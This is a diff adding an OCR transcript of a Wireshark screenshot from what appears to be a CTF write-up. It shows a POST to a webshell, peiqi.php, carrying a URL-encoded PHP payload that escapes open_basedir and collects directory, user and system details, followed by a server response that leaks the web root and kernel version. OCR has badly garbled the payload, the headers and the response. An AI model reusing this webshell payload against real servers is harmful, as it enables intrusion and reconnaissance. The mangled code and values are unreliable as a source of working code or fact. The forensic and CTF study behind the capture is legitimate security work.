@@ -1,0 +1,31 @@
+# OCR: c8f83fb18426570c5198f05c3811fd17.jpg
+# 来源: .\02-WriteUp\2024\c8f83fb18426570c5198f05c3811fd17.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:41
+
+(Ml Wireshark - 3883 HTTP 3 (tep.stream eq 110) - tcpdump .cap_ - o x
+POST /peiqi.php HTTP/2.2
+Host: 222.2.2.180
+Accept-Encoding: gzip, deflate
+User-Agent: Opera/12-0(Windows NT 5.2;Ujen)Presto/22.9.168 Version/12.60
+Content-Type: application/x-mw-form-urlencoded
+Content-Length: 1484
+Connection: close
+peigi-84oini_set(%22display_errorsK22X2cX20%220%22)X38KAdset_time Limit 0)%30X240pdirXsoN4aini_get (X220pen_basedirX22)X3Bif X24opdir)X20S7BX240parcKsDpreg_ split (R22A2FRSCASCHSCAS
+(CRICRSCRIFRIFR22RICK2AOpdir )RSBX2AOcuERBOMIrname (K24_SERVERKSBR22ECRIPT_FILEIMMER22E50 )83BK24tadirA30K22, 7ibecAk22%38%4Onkdir (K24tndir )X3B%AOchdir (X24tedir)RSBWOini_set (K220pen_
+basedirR22820%22. .522)%38 for (X24i2300830424i43Cs i zeoF (X24oparr)X3B%241X78%2B)X7B84Ochdi ($22. .422)SSER7ORABIni_set (X22open_basedir&2742CK22%2F%22) K3BKAOradir (K240cwd. 22222. AD
+‘dtadir) 538470438 Funct ionk20asenc (A2dout )X78returnk20%24out¥38X7O%3EFunctionk2Basoutput ()X7BE2output¥s0ob_get_contents()¥380b_end_clean( )¥3BechoX20X22dsd7422..4229¢ fecs¥22%38echo
+/$zo%aeasenc (X240utput )X3BechoX204222F53%22.42225eb2472%38X700b_start ()$3BtryX7BL240XSDdirname(X24_SERVERRSEXZISCRIPT_FILENANEXZ24SD) X3Bif (X24D830X30X22422)$240%2Ddirname (X24 SERV
+[ERKSBA2ZPATH_TRANSLATEDA2285D) X3BX24RX30%22%7B3240¥7DROOKZ2XSBIf (subst (X24DK2COR2CI) !XBDA2ZRZFRZ2)¥7B For each (range (X22CX22%2CK227422) as¥2OR24L) if (is_dir (X22%7EX241870%3AK22) )828
+. X30%22878K24L870%3A822836X7De seR7B424R. %30%22%27 822X3BR7ORZAR. X3OR22¥09R22EIBE24UNID( Function exists (K22posix_getegid¥22) )¥3FR40posix_getpwuid (ROposix_geteuid( ))X3AR22822x38%
+2430 24u)33FR24UNSBR2InaNeRZISORIAROget_current_user()¥3BE24R,¥30php_unane ()¥3BK24R. X3DK22KOTE7BS2453870822%38e chok2OR2GRESBRSER7OCAtCh Except ionk20¥2de )¥7BechoB2OR22ERRORSSA
+S2FAQFAD2.ADGe--K3ERetHessage( )SER7OXSBasoutput()X3Bdie()XSBHTTP/1.1 286 OK
+Server! nginx
+Date: Fri, 04 Mar 2022 07:16:25 GIT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: close
+Vary: Accept-Encoding
+Content-Encoding: gzip
+db 5d29# fec4/mm/wniroot /wiv.tpshop.com / Linux localhost -localdomain 3.1
+}-514.€17.x86_64 #1 SHP Tue Nov 22 16:42:41 UTC 2016 x86_64 E
